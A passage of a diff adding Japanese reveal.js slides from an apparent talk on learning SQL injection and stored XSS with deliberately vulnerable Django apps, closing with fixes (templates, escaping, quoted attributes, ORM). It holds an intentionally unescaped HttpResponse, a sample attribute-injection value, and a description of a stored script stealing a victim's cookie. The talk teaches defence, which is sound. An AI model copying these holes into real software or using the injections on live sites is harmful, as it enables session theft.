+</div></blockquote>
+</li>
+</ul>
+</section>
+<section >
+<h3>「現実にこんなDjangoアプリ書きます？」</h3>
+<ul class="simple">
+<li><p>ここまで <code class="docutils literal notranslate"><span class="pre">HttpResponse</span></code> で <strong>エスケープ</strong> しないと、JavaScriptが実行されることを示しました</p></li>
+<li><p>XSS脆弱性を作り込んでしまう例へ進みます</p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>持続型XSS</h2>
+<blockquote>
+<div><p>攻撃用のJavaScriptが、攻撃対象のデータベースなどに保存される場合 (徳丸本 p.231)</p>
+</div></blockquote>
+<ul class="simple">
+<li><p>持続型とは別に、 <em>反射型</em> もあります</p></li>
+</ul>
+</section>
+<section >
+<h3>持続型XSSできてしまうDjangoアプリ</h3>
+<p><a class="reference external" href="http://127.0.0.1:8000/todolist/">http://127.0.0.1:8000/todolist/</a></p>
+<ul class="simple">
+<li><p>TODOの一覧ページ</p></li>
+<li><p>TODOの作成ページ（要ログイン）</p></li>
+</ul>
+</section>
+<section >
+<h3>2人のユーザ</h3>
+<ul class="simple">
+<li><p><strong class="command">python manage.py createsuperuser</strong> （<code class="docutils literal notranslate"><span class="pre">docker</span> <span class="pre">compose</span> <span class="pre">run</span></code> で流しやすいため）</p></li>
+<li><p>eviluser（攻撃者）</p></li>
+<li><p>wasbook（被害者）</p></li>
+</ul>
+</section>
+<section >
+<h3>持続型XSSを引き起こす脆弱性</h3>
+<ul class="simple">
+<li><p>一覧はDBに保存されたTODOを <strong>エスケープせずに</strong> <code class="docutils literal notranslate"><span class="pre">HttpResponse</span></code> で返す実装🙅‍♂️</p></li>
+<li><p>作成するときにユーザはscriptタグを入力できる</p></li>
+</ul>
+</section>
+<section >
+<h3>eviluserでログイン</h3>
+<p><a class="reference external" href="http://127.0.0.1:8000/todolist/">http://127.0.0.1:8000/todolist/</a></p>
+<ul class="simple">
+<li><p>空のページで始まる</p></li>
+<li><p>「パソコンを買う」を1つ保存（一覧に加わる）</p></li>
+</ul>
+</section>
+<section >
+<h3>eviluserが持続型XSSで攻撃👹</h3>
+<p><a class="reference external" href="http://127.0.0.1:8000/todolist/new/">http://127.0.0.1:8000/todolist/new/</a></p>
+<ul class="simple">
+<li><p>Todoの内容に攻撃用 <strong>JavaScriptコードを記入</strong></p></li>
+<li><p>Djangoフォームはこれを保存する</p></li>
+</ul>
+</section>
+<section >
+<h3>何も知らないwasbookユーザがログイン</h3>
+<ul class="simple">
+<li><p>別のブラウザ（シークレットウィンドウ）でログイン</p></li>
+<li><p>ログイン一覧ページに遷移すると、保存されたTODOが表示され、scriptタグが実行され、cookieが送信される☠️</p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>「分かりました！テンプレートを使います！！」</h2>
+<ul class="simple">
+<li><p>多数は対処できるのですが、 <strong>注意が必要</strong></p></li>
+<li><p><a class="reference external" href="https://docs.djangoproject.com/ja/4.2/topics/security/#cross-site-scripting-xss-protection">クロス・サイト・スクリプティング (XSS) の防御</a> にはテンプレートの落とし穴も</p></li>
+</ul>
+<pre data-id="id47"><code data-trim data-noescape class="html">&lt;style class={{ var }}&gt;...&lt;/style&gt;</code></pre>
+</section>
+<section >
+<h3>HTMLタグの <strong>属性値はクォートで囲む</strong></h3>
+<ul>
+<li><p>1つ前のスライドのテンプレートの書き方には、脆弱性がある</p>
+<blockquote>
+<div><p>var の値が 'class1 onmouseover=javascript:func()' にセットされた場合</p>
+</div></blockquote>
+</li>
+</ul>
+<pre data-id="html"><code data-trim data-noescape class="diff">-&lt;style class={{ var }}&gt;...&lt;/style&gt;
++&lt;style class=&quot;{{ var }}&quot;&gt;...&lt;/style&gt;</code></pre>
+</section>
+</section>
+<section>
+<section >
+<h2>XSSのまとめ🌯</h2>
+<ul class="simple">
+<li><p><strong>悪意を持ったHTMLやJavaScriptコードを注入</strong> できてしまう脆弱性</p></li>
+<li><p>悪意を持ったコードがデータベースに保存される、 <strong>持続型</strong> で攻撃した</p></li>
+</ul>
+</section>
+<section >
+<h3>XSS脆弱性を埋め込む実装🙅‍♂️</h3>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">HttpResponse</span></code> に <strong>エスケープせず</strong> にHTMLやJavaScriptコードを渡してしまう</p></li>
+</ul>
+<pre data-id="id49"><code data-trim data-noescape class="python">def alert(request):
+    return HttpResponse('&lt;script&gt;alert(&quot;XSSです&quot;)&lt;/script&gt;')</code></pre>
+</section>
+<section >
+<h3>XSSの脆弱性を埋め込まない実装</h3>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">django.utils.html.escape</span></code> でエスケープ</p></li>
+<li><p><strong>Djangoテンプレート</strong> を使う</p>
+<ul>
+<li><p>さらに、HTMLの <strong>属性値はクォートで囲む</strong></p></li>
+</ul>
+</li>
+</ul>
+</section>
+<section >
+<h3>⚠️この場限りにしてくださいね（攻撃になっちゃうので！）</h3>
+<ul class="simple">
+<li><p>あなたが利用しているWebアプリに、ここで紹介したJavaScriptを保存しないでください</p></li>
+<li><p>それは <strong>攻撃</strong> です（学習用のこのアプリだけにしてください）</p></li>
+</ul>
+</section>
+<section >
+<h3>重ねてありがとう、Djangoチュートリアル</h3>
+<ul class="simple">
+<li><p>XSSがどういうものか分かっていなかった あの日の私、チュートリアルに沿うことで回避していた</p></li>
+<li><p><a class="reference external" href="https://tutorial.djangogirls.org/ja/django_templates/">Djangoテンプレート</a></p></li>
+</ul>
+</section>
+<section >
+<h3>🏃‍♂️関連アウトプット</h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://nikkie-ftnext.hatenablog.com/entry/django-response-xss-protection-introduction">DjangoにおけるXSS対策理解の一歩目。JavaScriptのコード片から作ったレスポンスを返してみる（HttpResponse・TemplateResponse）</a></p></li>
+<li><p><a class="reference external" href="https://nikkie-ftnext.hatenablog.com/entry/grasp-javascript-window-open-in-xss-example">XSSの例に登場するJavaScriptのopen（window.open）を理解したく手を動かす</a></p></li>
+</ul>
+</section>
+</section>
+<section>
+<section >
+<h2>まとめ：Djangoアプリに作り込んで学ぶ脆弱性</h2>
+<p>SQLインジェクションとXSS篇</p>
+</section>
+<section >
+<h3>SQLインジェクション💉</h3>
+<ul class="simple">
+<li><p>文字列をフォーマットしてSQL文を組み立てる実装は、脆弱性</p></li>
+<li><p>任意のSQLを実行できてしまう</p></li>
+<li><p>対策： <strong>ORM</strong> を使いましょう</p></li>
+</ul>
+</section>
+<section >
+<h3>XSS🙅</h3>
+<ul class="simple">
+<li><p>HTMLやJavaScriptをエスケープしない実装は、脆弱性</p></li>
+<li><p>任意のJavaScriptを実装できてしまう</p></li>
+<li><p>対策： <strong>テンプレート</strong> を使いましょう（+属性値はクォートで囲む）</p></li>
+</ul>
+</section>
+<section >
+<h3>ユーザ入力を信用してはならぬ</h3>
+<ul class="simple">
+<li><p>SQLインジェクションの例では、ユーザが任意のSQLを実行しようとした</p>
+<ul>
+<li><p>ユーザ入力からSQLを作るのではなく、 <strong>ORM</strong> に渡す（プレースホルダ）</p></li>
+</ul>
+</li>
+<li><p>XSSの例では、ユーザが任意のJavaScriptを保存して、表示時に実行しようとした</p>
+<ul>
+<li><p>ユーザ入力は（テンプレートを通して） <strong>エスケープ</strong> して画面に表示</p></li>
+</ul>
+</li>
+</ul>
+</section>
+<section >
+<h3>Djangoの脆弱性対策がすごい👏</h3>
+<ul class="simple">
+<li><p>ORMやテンプレートなど、Djangoが提供する方法では脆弱性が対策されている</p></li>
+<li><p>過去の私はSQLインジェクションやXSSの <strong>知識が全然なかった</strong> が、Djangoのおかげで <strong>セキュリティ対策</strong> したアプリが作れていた（フールプルーフ）</p></li>
+</ul>
+</section>
+<section >
+<h3>ご清聴ありがとうございました</h3>
+<p>Enjoy coding with Django!</p>
+</section>
+</section>
+<section >
+<h2>Appendix</h2>
+</section>
+<section>
+<section >
+<h2>参考文献</h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.sbcr.jp/product/4797393163/">体系的に学ぶ 安全なWebアプリケーションの作り方 第2版</a> （徳丸本）</p>
+<ul>
+<li><p><a class="reference external" href="https://wasbook.org/">https://wasbook.org/</a></p></li>
+</ul>
+</li>
+<li><p><a class="reference external" href="https://www.shoeisha.co.jp/book/detail/9784798153957">実践Django</a></p></li>
+</ul>
+</section>
+<section >
+<h3>ありがとう、徳丸さん</h3>
+<ul class="simple">
+<li><p>徳丸さん作のやられサイト badtodo <a class="reference external" href="https://github.com/ockeghem/badtodo">https://github.com/ockeghem/badtodo</a></p></li>
+<li><p>解説動画シリーズ <a class="reference external" href="https://youtube.com/playlist?list=PLWiFLcGkQgLzxPw23mQniahM_kPH_EsVH&amp;si=rIfuJtNk_D6QFPaf">Bad Todoで脆弱性診断実習</a></p></li>
+</ul>
+</section>
+<section >
+<h3>ありがとう、チームメイト諸氏</h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://tech.uzabase.com/entry/2023/08/04/151018">徳丸さん作 Bad Todo List を使ったハンズオンを開催したよ（ご本人登場）</a></p></li>
+<li><p>徳丸さんのbadtodoにSQLインジェクションを試す機会がなかったら、この発表はきっとなかったでしょう</p></li>
+</ul>
+</section>
+</section>
+<section >
+<h2>EOF</h2>
+</section>
+
+        </div>
+    </div>
+    
+    <script src="../_static/revealjs4/dist/reveal.js"></script>
+    
+    
+      <script src="../_static/revealjs4/plugin/highlight/highlight.js"></script>
+      <script src="../_static/revealjs4/plugin/notes/notes.js"></script>
+      
+    
+    <script>
+        var revealjsConfig = new Object();
+        Object.assign(revealjsConfig, 
+    {
+        controls: true,
+        progress: true,
+        history: true,
+        center: true,
+        transition: "none",
+        slideNumber: "c/t",
+    }
+);
+        
+        
+        
+          revealjsConfig.plugins = [
+            RevealHighlight,RevealNotes,
+          ];
+        
+        // More info https://github.com/hakimel/reveal.js#configuration
+        Reveal.initialize(revealjsConfig);
+    </script>
+
+  </body>
+</html>
